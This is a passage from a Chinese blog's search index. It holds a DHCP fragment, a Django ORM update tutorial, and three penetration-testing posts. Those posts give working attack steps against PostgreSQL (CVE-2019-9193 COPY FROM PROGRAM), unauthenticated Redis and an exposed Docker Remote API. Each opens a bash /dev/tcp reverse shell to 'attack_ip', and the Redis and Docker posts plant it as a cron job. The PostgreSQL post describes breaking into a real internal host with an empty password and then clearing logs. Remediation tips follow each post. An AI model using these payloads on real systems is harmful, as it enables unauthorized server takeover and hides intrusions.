discover信息。此时，在DHCP服务器管理控制台中，会显示此IP地址为BAD_ADDRESS。<br>如果网络上没有其它主机使用此IP地址，则客户机的TCP/IP使用租约中提供的IP地址完成初始化，从而可以和其他网络中的主机进行通讯。</p><h4 id="DHCP缺点："><a href="#DHCP缺点：" class="headerlink" title="DHCP缺点："></a>DHCP缺点：</h4><p>1.DHCP不能查出网络上非DHCP客户机已经在使用的IP地址，例如网络有一非DHCP客户机A已经手工分配了IP地址:100.53.46.5，但是DHCP服务器并不能识别出该地址已经被分配了，它向DHCP客户机配了一个重复的IP地址:100.53.46.5，这就导致了IP地址的冲突。当然，这些IP地址可以从被配置在DHCP服务器上的任何范围中排除。<br>2.当网络上存在两个DHCP服务器时，一个DHCP服务器不和另一个DHCP服务器通信，就不能查出已被其他服务器租出去的IP地址。因此，两个DHCP服务器不应该在它们各自的范围中使用相同的IP地址。此外，DHCP服务器不能跨路由器与客户机通信，除非路由器允许BOOTP转发，或者子网允许DHCP中转借。</p>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
      <category>DHCP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Django model篇（一）：update用法介绍</title>
    <link href="/2020/06/12/Django%20model%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9Aupdate%E7%94%A8%E6%B3%95%E4%BB%8B%E7%BB%8D/"/>
    <url>/2020/06/12/Django%20model%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9Aupdate%E7%94%A8%E6%B3%95%E4%BB%8B%E7%BB%8D/</url>
    
    <content type="html"><![CDATA[<h3 id="model-update常用方法"><a href="#model-update常用方法" class="headerlink" title="model update常用方法"></a>model update常用方法</h3><p>方法一：</p><pre><code class="hljs python">User.objects.filter(id=<span class="hljs-number">1</span>).update(username=<span class="hljs-string">'tachiulam'</span>,is_active=<span class="hljs-literal">True</span>)</code></pre><p>方法二：</p><pre><code class="hljs python">_t = User.objects.get(id=<span class="hljs-number">1</span>)_t.username=<span class="hljs-string">'tachiulam'</span>_t.is_active=<span class="hljs-literal">True</span>_t.save()</code></pre><p>方法一适合更新一批数据，类似于mysql语句update user set username=’tachiulam’ where id = 1</p><p>方法二适合更新一条数据，也只能更新一条数据，当只有一条数据更新时推荐使用此方法，另外此方法还有一个好处，我们接着往下看</p><h3 id="具有auto-now属性字段的更新"><a href="#具有auto-now属性字段的更新" class="headerlink" title="具有auto_now属性字段的更新"></a>具有auto_now属性字段的更新</h3><p>我们通常会给表添加三个默认字段</p><ul><li><p>自增ID，这个django已经默认加了，就像上边的建表语句，虽然只写了username和is_active两个字段，但表建好后也会有一个默认的自增id字段</p></li><li><p>创建时间，用来标识这条记录的创建时间，具有auto_now_add属性，创建记录时会自动填充当前时间到此字段</p></li><li><p>修改时间，用来标识这条记录最后一次的修改时间，具有auto_now属性，当记录发生变化时填充当前时间到此字段<br>就像下边这样的表结构</p></li></ul><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span><span class="hljs-params">(models.Model)</span>:</span>    create_time = models.DateTimeField(auto_now_add=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'创建时间'</span>)    update_time = models.DateTimeField(auto_now=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'更新时间'</span>)    username = models.CharField(max_length=<span class="hljs-number">255</span>, unique=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'用户名'</span>)    is_active = models.BooleanField(default=<span class="hljs-literal">False</span>, verbose_name=<span class="hljs-string">'激活状态'</span>)</code></pre><p>当表有字段具有auto_now属性且你希望他能自动更新时，必须使用上边方法二的更新，不然auto_now字段不会更新，也就是：</p><pre><code class="hljs python">_t = User.objects.get(id=<span class="hljs-number">1</span>)_t.username=<span class="hljs-string">'tachiulam'</span>_t.is_active=<span class="hljs-literal">True</span>_t.save()</code></pre><h3 id="json-dict类型数据更新字段"><a href="#json-dict类型数据更新字段" class="headerlink" title="json/dict类型数据更新字段"></a>json/dict类型数据更新字段</h3><p>目前主流的web开放方式都讲究前后端分离，分离之后前后端交互的数据格式大都用通用的json型，那么如何用最少的代码方便的更新json格式数据到数据库呢？同样可以使用如下两种方法：</p><p>方法一：</p><pre><code class="hljs python">data = &#123;<span class="hljs-string">'username'</span>:<span class="hljs-string">'tachiulam'</span>,<span class="hljs-string">'is_active'</span>:<span class="hljs-string">'0'</span>&#125;User.objects.filter(id=<span class="hljs-number">1</span>).update(**data)</code></pre><ul><li><p>同样这种方法不能自动更新具有auto_now属性字段的值</p></li><li><p>通常我们再变量前加一个星号(*)表示这个变量是元组/列表，加两个星号表示这个参数是字典</p></li></ul><p>方法二：</p><pre><code class="hljs python">data = &#123;<span class="hljs-string">'username'</span>:<span class="hljs-string">'tachiulam'</span>,<span class="hljs-string">'is_active'</span>:<span class="hljs-string">'0'</span>&#125;_t = User.objects.get(id=<span class="hljs-number">1</span>)_t.__dict__.update(**data)_t.save()</code></pre><ul><li><p>方法二和方法一同样无法自动更新auto_now字段的值</p></li><li><p>注意这里使用到了一个dict方法</p></li></ul><p>方法三：</p><pre><code class="hljs python">_t = User.objects.get(id=<span class="hljs-number">1</span>)_t.role=Role.objects.get(id=<span class="hljs-number">3</span>)_t.save()</code></pre><h3 id="ForeignKey字段更新"><a href="#ForeignKey字段更新" class="headerlink" title="ForeignKey字段更新"></a>ForeignKey字段更新</h3><p>假如我们的表中有Foreignkey外键时，该如何更新呢？</p><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span><span class="hljs-params">(models.Model)</span>:</span>    create_time = models.DateTimeField(auto_now_add=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'创建时间'</span>)    update_time = models.DateTimeField(auto_now=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'更新时间'</span>)    username = models.CharField(max_length=<span class="hljs-number">255</span>, unique=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'用户名'</span>)    is_active = models.BooleanField(default=<span class="hljs-literal">False</span>, verbose_name=<span class="hljs-string">'激活状态'</span>)    role = models.ForeignKey(Role, on_delete=models.CASCADE, null=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'角色'</span>)</code></pre><p>方法一：</p><pre><code class="hljs python">User.objects.filter(id=<span class="hljs-number">1</span>).update(role=<span class="hljs-number">2</span>)</code></pre><ul><li><p>最简单的方法，直接让给role字段设置为一个id即可</p></li><li><p>当然也可以用dict作为参数更新：</p><pre><code class="hljs python">User.objects.filter(id=<span class="hljs-number">1</span>).update(**&#123;<span class="hljs-string">'username'</span>:<span class="hljs-string">'tachiulam'</span>,<span class="hljs-string">'role'</span>:<span class="hljs-number">3</span>&#125;)</code></pre></li></ul><p>方法二：</p><pre><code class="hljs python">_role = Role.objects.get(id=<span class="hljs-number">2</span>)User.objects.filter(id=<span class="hljs-number">1</span>).update(role=_role)</code></pre><ul><li><p>也可以赋值一个实例给role</p></li><li><p>当然也可以用dict作为参数更新：</p></li></ul><pre><code class="hljs python">_role = Role.objects.get(id=<span class="hljs-number">1</span>)User.objects.filter(id=<span class="hljs-number">1</span>).update(**&#123;<span class="hljs-string">'username'</span>:<span class="hljs-string">'tachiulam'</span>,<span class="hljs-string">'role'</span>:_role&#125;)</code></pre><p>方法三：</p><pre><code class="hljs python">_t = User.objects.get(id=<span class="hljs-number">1</span>)_t.role=Role.objects.get(id=<span class="hljs-number">3</span>)_t.save()</code></pre><ul><li><p>注意：这里的role必须赋值为一个对象，不能写id，不然会报错”User.role” must be a “Role” instance</p></li><li><p>当使用dict作为参数更新时又有一点不同，如下代码：</p></li></ul><pre><code class="hljs python">_t = User.objects.get(id=<span class="hljs-number">1</span>)_t.__dict__.update(**&#123;<span class="hljs-string">'username'</span>:<span class="hljs-string">'tachiulam'</span>,<span class="hljs-string">'role_id'</span>:<span class="hljs-number">2</span>&#125;)_t.save()</code></pre><ul><li><p>Foreignkey外键必须加上<code>_id</code>，例如：{‘role_id’:3}</p></li><li><p>role_id后边必须跟一个id（int或str类型都可），不能跟role实例</p></li></ul><h3 id="ManyToManyField字段更新"><a href="#ManyToManyField字段更新" class="headerlink" title="ManyToManyField字段更新"></a>ManyToManyField字段更新</h3><p>假如我们的表中有ManyToManyField字段时更新又有什么影响呢？</p><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span><span class="hljs-params">(models.Model)</span>:</span>    create_time = models.DateTimeField(auto_now_add=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'创建时间'</span>)    update_time = models.DateTimeField(auto_now=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'更新时间'</span>)    username = models.CharField(max_length=<span class="hljs-number">255</span>, unique=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'用户名'</span>)    is_active = models.BooleanField(default=<span class="hljs-literal">False</span>, verbose_name=<span class="hljs-string">'激活状态'</span>)    role = models.ForeignKey(Role, on_delete=models.CASCADE, null=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'角色'</span>)    groups = models.ManyToManyField(Group, null=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'组'</span>)</code></pre><p>m2m更新：m2m字段没有直接更新的方法，只能通过清空再添加的方法更新了</p><pre><code class="hljs python">_t = User.objects.get(id=<span class="hljs-number">1</span>)_t.groups.clear()_t.groups.add(*[<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>])_t.save()</code></pre><ul><li><p>add()：m2m字段添加一个值，当有多个值的时候可用列表，参照上边例子</p></li><li><p>_t.groups.add(2)</p></li><li><p>_t.groups.add(Group.objects.get(id=2))</p></li><li><p>remove()：m2m字段移除一个值，，当有多个值的时候可用列表，参照上边例子</p></li><li><p>_t.groups.remove(2)</p></li><li><p>_t.groups.remove(Group.objects.get(id=2))</p></li><li><p>clear()：清空m2m字段的值</p></li></ul><p><a href="https://mp.weixin.qq.com/s?__biz=MzU5MDY1MzcyOQ==&mid=2247483702&idx=1&sn=720529d0cd15ecf11e07392d5da33a47&scene=21#wechat_redirect" target="_blank" rel="noopener">🔗原文链接</a></p>]]></content>
    
    
    <categories>
      
      <category>Django</category>
      
      <category>model</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Django</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PostgreSQL任意命令执行漏洞利用（CVE-2019-9193)</title>
    <link href="/2020/05/25/PostgreSQL%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%88CVE-2019-9193/"/>
    <url>/2020/05/25/PostgreSQL%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%88CVE-2019-9193/</url>
    
    <content type="html"><![CDATA[<p>最近没事曰曰内网，偶然发现了一个使用空密码的pg（是的，连爆破都省了）。用navicat连上去看了下几个库都是一些业务测试数据，没什么好收集；不死心，google了一下发现有个比较新的CVE好像可以操作一下~</p><h4 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h4><p>最近，安全研究人员披露了PostgreSQL实例代码执行漏洞（CVE-2019-9193）的漏洞细节。具有数据库 服务器 文件读取权限的攻击者可以利用此漏洞执行任意系统命令。</p><p>从9.3版本开始，Postgres新增了一个COPY TO/FROM PROGRAM功能，允许数据库的超级用户以及pg_read_server_files组中的任何用户执行操作系统命令。</p><p>**受影响的版本（貌似更新版本无解）</p><p>PostgreSQL&gt; = 9.3**</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="pg数据库连接"><a href="#pg数据库连接" class="headerlink" title="pg数据库连接"></a>pg数据库连接</h5><pre><code class="hljs plain"># 连接postgressql，虽然是内网ip但还是打一下码吧psql -U postgres -h 172.xx.xxx.xx</code></pre><p><img src="/img/pg_res1.png" srcset="/img/loading.gif" alt="image"></p><h5 id="开始攻击（直接套用网上POC）"><a href="#开始攻击（直接套用网上POC）" class="headerlink" title="开始攻击（直接套用网上POC）"></a>开始攻击（直接套用网上POC）</h5><pre><code class="hljs plain"># 删除并创建用于保存系统命令执行结果的表 DROP TABLE IF EXISTS cmd_exec;CREATE TABLE cmd_exec(cmd_output text);# 命令执行测试，多试几条COPY cmd_exec FROM PROGRAM &#39;id&#39;;COPY cmd_exec FROM PROGRAM &#39;whoami&#39;;# 查看结果SELECT * FROM cmd_exec;</code></pre><p><img src="/img/pg_res2.png" srcset="/img/loading.gif" alt="image"><br>我的🐎，还是个root用户，，都不用提权了（这安全意识阿。。。）</p><h5 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h5><p>虽然都可以执行系统命令了，拿不拿shell无所谓，但拿了还是要方便一些；</p><pre><code class="hljs plain"># attack机器上开启监听nc -lvnp 8888# 利用pg执行远程连接命令COPY cmd_exec FROM PROGRAM &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;attack_ip&#x2F;8888 0&gt;&amp;1&#39;;</code></pre><p>attack机器已经返回shell连接了~<br><img src="/img/pg_res3.png" srcset="/img/loading.gif" alt="image"></p><p>记录一下，顺便清除记录收工了。</p><h4 id="解决方案建议"><a href="#解决方案建议" class="headerlink" title="解决方案建议"></a>解决方案建议</h4><p>1、pg_read_server_files，pg_write_server_files和pg_execute_server_program角色涉及读取和写入具有大权限的数据库服务器文件。将此角色权限分配给数据库用户时，应慎重考虑。</p><p>2、使用强密码！！！</p><p>3、进行网络隔离，只允许需要的IP连接；</p><p><a href="https://zhuanlan.zhihu.com/p/143443516" target="_blank" rel="noopener">🔗知乎链接</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Redis未授权访问漏洞利用</title>
    <link href="/2020/05/25/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <url>/2020/05/25/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h4 id="漏洞简介及危害"><a href="#漏洞简介及危害" class="headerlink" title="漏洞简介及危害"></a>漏洞简介及危害</h4><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器、添加计划任务、写入Webshell等操作。</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><pre><code class="hljs plain"># redis安装wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-3.2.0.tar.gztar -xvzf redis-3.2.0.tar.gzcd redis-3.2.0make# 修改配置文件vim redis.conf# bind 127.0.0.1               前面加上#号    # protected-mode设为no protected-mode no# 保存退出# 启动redis-serverredis-server redis-conf</code></pre><p>观察到如下输出，漏洞环境搭建成功<br><img src="/img/redis_res1.png" srcset="/img/loading.gif" alt="image"></p><h5 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h5><pre><code class="hljs plain"># 在攻击主机上打开9999端口监听[root@]# nc -vv -l -p 9999</code></pre><h5 id="未授权访问验证"><a href="#未授权访问验证" class="headerlink" title="未授权访问验证"></a>未授权访问验证</h5><pre><code class="hljs plain"># 连接靶机redisredis -h target_ip# 获取redis版本等信息target_ip&gt; info</code></pre><p><img src="/img/redis_res2.png" srcset="/img/loading.gif" alt="image"></p><h5 id="写入shell"><a href="#写入shell" class="headerlink" title="写入shell"></a>写入shell</h5><pre><code class="hljs plain"># 设置变量target_ip:6379&gt; set xx &quot;\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;attack_ip&#x2F;9999 0&gt;&amp;1\n&quot;OK# 修改redis默认目录和rdb文件target_ip:6379&gt; config set dir &#x2F;var&#x2F;spool&#x2F;cronOKtarget_ip:6379&gt; config set dbfilename rootOKtarget_ip:6379&gt; saveOK</code></pre><h5 id="成功反弹宿主机shell"><a href="#成功反弹宿主机shell" class="headerlink" title="成功反弹宿主机shell"></a>成功反弹宿主机shell</h5><p><img src="/img/redis_res3.png" srcset="/img/loading.gif" alt="image"></p><blockquote><p>P.S ，测试完记得关闭存在漏洞的redis</p></blockquote><h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><p>方法一： 可以修改绑定的IP、端口和指定访问者IP 具体根据实际情况来设定，也可以直接在服务器防火墙上做设置。</p><p>方法二： 设置访问密码 在 redis.conf 中找到“requirepass”字段，取消注释并在后面填上你需要的密码。 注：修改redis的配置需要重启redis才能生效。</p><p>7 <a href="https://zhuanlan.zhihu.com/p/142798377" target="_blank" rel="noopener">🔗知乎链接</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker Remote API 未授权访问漏洞利用</title>
    <link href="/2020/05/23/Docker-Remote-API-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <url>/2020/05/23/Docker-Remote-API-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h4 id="漏洞简介及危害"><a href="#漏洞简介及危害" class="headerlink" title="漏洞简介及危害"></a>漏洞简介及危害</h4><p>Docker是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的LINUX机器上，也可以实现虚拟化。 Docker swarm 是一个将docker集群变成单一虚拟的docker host工具，使用标准的Docker API，能够方便docker集群的管理和扩展，由docker官方提供。</p><p>Docker Remote API 是一个取代远程命令行界面（rcli）的REST API。Docker Remote API如配置不当可导致未授权访问，攻击者利用 docker client 或者 http 直接请求就可以访问这个 API，可能导致敏感信息泄露，黑客也可以删除Docker上的数据。 攻击者可进一步利用Docker自身特性，直接访问宿主机上的敏感信息，或对敏感文件进行修改，最终完全控制服务器。</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h5><pre><code class="hljs plain"># 靶机IP&#x2F;端口172.19.101.34 2375# 操作系统linux_x86</code></pre><h5 id="未授权访问测试"><a href="#未授权访问测试" class="headerlink" title="未授权访问测试"></a>未授权访问测试</h5><pre><code class="hljs plain">docker -H tcp:&#x2F;&#x2F;172.19.101.34:2375 images# 返回镜像信息，漏洞存在</code></pre><h5 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h5><pre><code class="hljs plain"># 在攻击主机上打开8088端口监听[root@]# nc -vv -l -p 8088</code></pre><h5 id="写入shell"><a href="#写入shell" class="headerlink" title="写入shell"></a>写入shell</h5><p>创建容器，利用bash和crontab计划任务向宿主机写入shell，centos系统挂载路径为。 /var/spool/cron/root；ubuntu系统为/var/spool/cron/crontabs/root；</p><pre><code class="hljs plain"># 查看宿主机可用镜像docker -H tcp:&#x2F;&#x2F;172.19.101.34:2375 images# 选择合适镜像创建容器docker -H tcp:&#x2F;&#x2F;172.19.101.34:2375 run -it -v &#x2F;var&#x2F;spool&#x2F;cron&#x2F;:&#x2F;var&#x2F;spool&#x2F;cron&#x2F; image_id &#x2F;bin&#x2F;bash# 启动刚刚创建的容器并连接docker -H tcp:&#x2F;&#x2F;172.19.101.34:2375 start ct_iddocker -H tcp:&#x2F;&#x2F;172.19.101.34:2375 exec -it --user root ct_id &#x2F;bin&#x2F;bash# 执行shell反弹命令root@bfd2539dfdc8:&#x2F;# echo &#39;* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;attack_ip&#x2F;8088 0&gt;&amp;1&#39; &gt;&gt; &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root</code></pre><h5 id="成功反弹宿主机shell"><a href="#成功反弹宿主机shell" class="headerlink" title="成功反弹宿主机shell"></a>成功反弹宿主机shell</h5><p><img src="/img/docker_res.png" srcset="/img/loading.gif" alt="image"></p><blockquote><p>P.S ，测试完记得删掉存在漏洞的容器</p></blockquote><h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><p>临时解决方案：</p><p>1、对2375端口做网络访问控制，如设置iptables策略仅允许指定的IP来访问Docker接口；</p><p>2、修改docker swarm的认证方式，使用TLS认证：Overview Swarm with TLS 和 Configure Docker Swarm for TLS这两篇文档，说的是配置好TLS后，Docker CLI 在发送命令到docker daemon之前，会首先发送它的证书，如果证书是由daemon信任的CA所签名的，才可以继续执行。</p><p><strong>总之、不要将端口直接暴露在公网，内网中使用需要设置严格的访问规则，并使用TLS。</strong></p><p><a href="https://zhuanlan.zhihu.com/p/142798377" target="_blank" rel="noopener">🔗知乎链接</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
